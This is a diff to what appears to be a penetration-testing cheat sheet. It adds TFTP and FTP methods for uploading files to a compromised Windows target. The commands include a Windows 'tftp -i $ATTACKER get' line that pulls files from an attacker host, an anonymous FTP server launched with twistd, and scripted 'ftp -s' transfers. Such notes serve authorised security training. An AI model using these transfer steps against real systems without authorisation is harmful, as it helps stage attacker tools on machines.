@@ -128,15 +128,23 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 ```
 
 ##### Uploading Files to Target Machine
+
+###### TFTP
 ```bash
 #tftp; cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
 service atftpd start
 
 # Windows
 tftp -i $ATTACKER get /download/location /save/location
-
 ```
+###### FTP
+```bash
+# Kali. Set up ftp server with anonymous logon;
+twistd -n ftp -p 21 -r /file/to/serve
 
+# Windows. Non-interactive FTP commands from file;
+ftp -s:ftp_commands.txt
+```
 
 ##### Bash Ping Sweeper
 ```bash
